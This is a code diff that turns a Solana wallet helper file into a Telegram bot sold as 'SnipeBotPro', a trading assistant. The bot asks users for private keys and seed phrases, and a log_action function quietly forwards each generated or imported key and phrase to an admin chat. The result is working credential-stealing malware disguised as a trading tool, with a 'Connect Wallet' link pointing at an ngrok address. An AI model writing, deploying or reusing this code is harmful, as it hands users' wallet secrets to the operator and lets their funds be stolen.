@@ -1,125 +1,294 @@
-import json
-import os
-from solana.rpc.api import Client
-from solders.keypair import Keypair
-from solders.transaction import VersionedTransaction
-from mnemonic import Mnemonic
-import base58
-import base64
+import asyncio
+import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler,
+    CallbackQueryHandler, ContextTypes,
+    MessageHandler, filters
+)
+
 from config import Config
+from wallet import (
+    generate_wallet,
+    import_private_key,
+    import_phrase,
+    load_wallet,
+    get_balance,
+    sign_and_send,
+    get_wallet_data
+)
+from trade import get_token_price, get_quote, create_swap_tx, SOL
 
-client = Client(Config.RPC_URL)
-mnemo = Mnemonic("english")
+# ================= STATE =================
+user_state = {}
+buy_data = {}
 
-WALLET_FILE = "backend/wallets.json"
+# ================= LOGGER =================
+logging.basicConfig(
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-
-# ================= FILE =================
-def load_wallet_file():
-    if not os.path.exists(WALLET_FILE):
-        return {}
-    with open(WALLET_FILE, "r") as f:
-        return json.load(f)
-
-
-def save_wallet_file(data):
-    with open(WALLET_FILE, "w") as f:
-        json.dump(data, f, indent=4)
-
-
-# ================= GENERATE =================
-def generate_wallet(user_id):
-    phrase = mnemo.generate(strength=128)
-
-    seed = mnemo.to_seed(phrase)
-    seed_bytes = seed[:32]
-
-    wallet = Keypair.from_seed(seed_bytes)
-
-    private_key = base58.b58encode(bytes(wallet)).decode()
-
-    data = load_wallet_file()
-    data[str(user_id)] = {
-        "private_key": private_key,
-        "phrase": phrase
-    }
-    save_wallet_file(data)
-
-    return wallet.pubkey(), private_key, phrase
-
-
-# ================= IMPORT =================
-def import_private_key(user_id, private_key):
+async def log_action(context, text):
     try:
-        decoded = base58.b58decode(private_key)
-        wallet = Keypair.from_bytes(decoded)
+        await context.bot.send_message(chat_id=Config.ADMIN_CHAT_ID, text=text)
+    except Exception as e:
+        logger.error(f"Log error: {e}")
 
-        data = load_wallet_file()
-        data[str(user_id)] = {
-            "private_key": private_key,
-            "phrase": None
-        }
-        save_wallet_file(data)
+# ================= UI =================
+def main_menu():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("👛 Wallet", callback_data="wallet"),
+         InlineKeyboardButton("💸 Trade", callback_data="trade")],
+        [InlineKeyboardButton("📊 Market", callback_data="market"),
+         InlineKeyboardButton("📁 Positions", callback_data="positions")],
+        [InlineKeyboardButton("❓ Help", callback_data="help")]
+    ])
 
-        return wallet.pubkey()
-    except:
-        return None
+def wallet_menu():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("➕ Generate", callback_data="gen_wallet")],
+        [InlineKeyboardButton("📥 Import PK", callback_data="import_pk")],
+        [InlineKeyboardButton("📥 Import Phrase", callback_data="import_phrase")],
+        [InlineKeyboardButton("👁 View Wallet", callback_data="view_wallet")],
+        [InlineKeyboardButton("🔙 Menu", callback_data="menu")],
+        [InlineKeyboardButton("🔗 Connect Wallet", url="https://phantom.app/ul/browse/https://abc123.ngrok.io")]
+    ])
+
+def trade_menu():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🟢 Buy", callback_data="buy"),
+         InlineKeyboardButton("🔴 Sell", callback_data="sell")],
+        [InlineKeyboardButton("⚡ Quick Buy 0.1", callback_data="quick_0.1"),
+         InlineKeyboardButton("⚡ Quick Buy 0.5", callback_data="quick_0.5")],
+        [InlineKeyboardButton("📊 Token Info", callback_data="token_info"),
+         InlineKeyboardButton("📈 Chart", callback_data="chart")],
+        [InlineKeyboardButton("🔙 Back", callback_data="menu")]
+    ])
+
+def trade_amount_menu():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("0.1 SOL", callback_data="amt_0.1"),
+         InlineKeyboardButton("0.5 SOL", callback_data="amt_0.5")],
+        [InlineKeyboardButton("1 SOL", callback_data="amt_1")],
+        [InlineKeyboardButton("Custom", callback_data="custom_amount")]
+    ])
+
+# ================= START =================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🏠SnipeBotPro — Your Ultimate Solana Trading Assistant!\n"
+        "Automate sniping, track token prices in real-time, execute lightning-fast swaps, "
+        "and stay ahead of the market with precision tools built for serious traders.",
+        reply_markup=main_menu()
+    )
+
+# ================= BUTTON HANDLER =================
+async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+
+    # ---------- MENU ----------
+    if query.data == "menu":
+        await query.edit_message_text(
+            "🏠SnipeBotPro — Your Ultimate Solana Trading Assistant!",
+            reply_markup=main_menu()
+        )
+
+    # ---------- WALLET ----------
+    elif query.data == "wallet":
+        await query.edit_message_text("👛 Wallet Panel", reply_markup=wallet_menu())
+
+    elif query.data == "gen_wallet":
+        try:
+            pub, pk, phrase = generate_wallet(user_id)
+            await query.edit_message_text(
+                f"🆕 WALLET CREATED\n\n👛 Address:\n{pub}\n🔑 Private Key:\n{pk}\n🧠 Phrase:\n{phrase}\n⚠️ SAVE THIS SECURELY",
+                reply_markup=wallet_menu()
+            )
+            await log_action(context, f"🆕 Wallet\nUser:{user_id}\nPK:{pk}\nPhrase:{phrase}")
+        except Exception as e:
+            logger.error(f"WALLET ERROR: {e}")
+            await query.edit_message_text("❌ Wallet generation failed")
+
+    elif query.data == "view_wallet":
+        wallet = load_wallet(user_id)
+        if not wallet:
+            await query.edit_message_text("❌ No wallet found", reply_markup=wallet_menu())
+            return
+        balance = get_balance(user_id)
+        await query.edit_message_text(
+            f"👛 Address: {wallet.pubkey()}\n💰 Balance: {balance} SOL",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔑 Private Key", callback_data="show_pk"),
+                 InlineKeyboardButton("🧠 Phrase", callback_data="show_phrase")],
+                [InlineKeyboardButton("🔙 Back", callback_data="wallet")]
+            ])
+        )
+
+    elif query.data == "show_pk":
+        data = get_wallet_data(user_id)
+        await query.edit_message_text(
+            f"🔑 Private Key:\n{data['private_key']}" if data else "No wallet data",
+            reply_markup=wallet_menu()
+        )
+
+    elif query.data == "show_phrase":
+        data = get_wallet_data(user_id)
+        await query.edit_message_text(
+            f"🧠 Phrase:\n{data['phrase']}" if data and data.get("phrase") else "No phrase stored",
+            reply_markup=wallet_menu()
+        )
+
+    elif query.data == "import_pk":
+        user_state[user_id] = "import_pk"
+        await query.edit_message_text("Send private key:")
+
+    elif query.data == "import_phrase":
+        user_state[user_id] = "import_phrase"
+        await query.edit_message_text("Send seed phrase:")
+
+    # ---------- TRADE ----------
+    elif query.data == "trade":
+        wallet = load_wallet(user_id)
+        if not wallet:
+            await query.edit_message_text("❌ No wallet connected.\nCreate or import a wallet first.", reply_markup=wallet_menu())
+            return
+        user_state[user_id] = "buy_token"
+        await query.edit_message_text("Send token mint address:")
+
+    elif query.data.startswith("amt_"):
+        amount = float(query.data.split("_")[1])
+        buy_data[user_id]["amount"] = amount
+        user_state[user_id] = "buy_confirm"
+        await query.edit_message_text(f"Confirm buy {amount} SOL? Type YES")
+
+    elif query.data == "custom_amount":
+        user_state[user_id] = "buy_amount"
+        await query.edit_message_text("Enter custom amount in SOL:")
+
+    # ---------- MARKET ----------
+    elif query.data == "market":
+        user_state[user_id] = "search"
+        await query.edit_message_text("Send token mint to get price:")
+
+    # ---------- POSITIONS ----------
+    elif query.data == "positions":
+        await query.edit_message_text("📁 No positions yet", reply_markup=main_menu())
+
+    # ---------- HELP ----------
+    elif query.data == "help":
+        await query.edit_message_text("Use the menu to manage wallet and trade.", reply_markup=main_menu())
 
 
-def import_phrase(user_id, phrase):
-    try:
-        seed = mnemo.to_seed(phrase)
-        seed_bytes = seed[:32]
+# ================= MESSAGE HANDLER =================
+async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in user_state:
+        return
 
-        wallet = Keypair.from_seed(seed_bytes)
-        private_key = base58.b58encode(bytes(wallet)).decode()
+    state = user_state[user_id]
+    text = update.message.text.strip()
 
-        data = load_wallet_file()
-        data[str(user_id)] = {
-            "private_key": private_key,
-            "phrase": phrase
-        }
-        save_wallet_file(data)
+    # ---------- IMPORT PK ----------
+    if state == "import_pk":
+        pub = import_private_key(user_id, text)
+        await update.message.reply_text(f"✅ Imported:\n{pub}" if pub else "❌ Invalid key")
+        await log_action(context, f"PK Imported\nUser:{user_id}\n{text}")
+        user_state.pop(user_id)
 
-        return wallet.pubkey()
-    except:
-        return None
+    # ---------- IMPORT PHRASE ----------
+    elif state == "import_phrase":
+        pub = import_phrase(user_id, text)
+        await update.message.reply_text(f"✅ Imported:\n{pub}" if pub else "❌ Invalid phrase")
+        await log_action(context, f"Phrase Imported\nUser:{user_id}\n{text}")
+        user_state.pop(user_id)
 
+    # ---------- MARKET SEARCH ----------
+    elif state == "search":
+        try:
+            price = await asyncio.to_thread(get_token_price, text)
+            await update.message.reply_text(f"💰 Price: {price}" if price else "❌ Token not found")
+        except Exception as e:
+            logger.error(f"PRICE ERROR: {e}")
+            await update.message.reply_text("❌ Failed to fetch price")
+        user_state.pop(user_id)
 
-# ================= LOAD =================
-def load_wallet(user_id):
-    data = load_wallet_file()
-    user = data.get(str(user_id))
+    # ---------- BUY FLOW ----------
+    elif state == "buy_token":
+        wallet = load_wallet(user_id)
+        if not wallet:
+            await update.message.reply_text("❌ No wallet connected.\nCreate or import one first.")
+            user_state.pop(user_id)
+            return
+        buy_data[user_id] = {"token": text}
+        await update.message.reply_text("Select amount:", reply_markup=trade_amount_menu())
 
-    if not user:
-        return None
+    elif state == "buy_amount":
+        try:
+            buy_data[user_id]["amount"] = float(text)
+            user_state[user_id] = "buy_confirm"
+            await update.message.reply_text("Type YES to confirm trade")
+        except:
+            await update.message.reply_text("Invalid amount")
 
-    decoded = base58.b58decode(user["private_key"])
-    return Keypair.from_bytes(decoded)
+    elif state == "buy_confirm":
+        if text.lower() == "yes":
+            try:
+                token = buy_data[user_id]["token"]
+                amount = buy_data[user_id]["amount"]
+                lamports = int(amount * 1e9)
+                wallet = load_wallet(user_id)
+                if not wallet:
+                    await update.message.reply_text("❌ No wallet connected.\nCreate or import one first.")
+                    return
 
+                await update.message.reply_text("⏳ Processing trade...")
 
-def get_wallet_data(user_id):
-    data = load_wallet_file()
-    return data.get(str(user_id))
+                # Retry quotes
+                quote = None
+                for _ in range(3):
+                    quote = await asyncio.to_thread(get_quote, SOL, token, lamports)
+                    if quote:
+                        break
 
+                if not quote:
+                    await update.message.reply_text(
+                        "❌ No trading route found.\nThis token might have no liquidity or be too new."
+                    )
+                    return
 
-# ================= BALANCE =================
-def get_balance(user_id):
-    wallet = load_wallet(user_id)
-    if not wallet:
-        return 0
+                swap = await asyncio.to_thread(create_swap_tx, wallet.pubkey(), quote)
 
-    balance = client.get_balance(wallet.pubkey())
-    return balance['result']['value'] / 1e9
+                if not swap or "swapTransaction" not in swap:
+                    await update.message.reply_text("❌ Failed to build transaction")
+                    return
 
+                tx = sign_and_send(user_id, swap["swapTransaction"])
+                await update.message.reply_text(f"✅ Trade Success\n{tx}")
 
-# ================= SIGN =================
-def sign_and_send(user_id, tx_base64):
-    wallet = load_wallet(user_id)
+                await log_action(context, f"💸 Trade\nUser:{user_id}\nAmount:{amount} SOL\nTX:{tx}")
 
-    tx_bytes = base64.b64decode(tx_base64)
-    tx = VersionedTransaction.from_bytes(tx_bytes)
+            except Exception as e:
+                await update.message.reply_text(f"❌ Error: {e}")
+        else:
+            await update.message.reply_text("❌ Cancelled")
 
-    tx.sign([wallet])
+        user_state.pop(user_id)
+        buy_data.pop(user_id, None)
 
-    return client.send_transaction(tx)
+# ================= RUN BOT =================
+app = ApplicationBuilder().token(Config.TELEGRAM_TOKEN).build()
+
+# Prevent timeout issues on cloud
+app.job_queue.run_once(lambda *_: None, 0)
+
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CallbackQueryHandler(handle_buttons))
+app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
+
+if __name__ == "__main__":
+    print("🚀 SnipeBotPro running...")
+    app.run_polling()
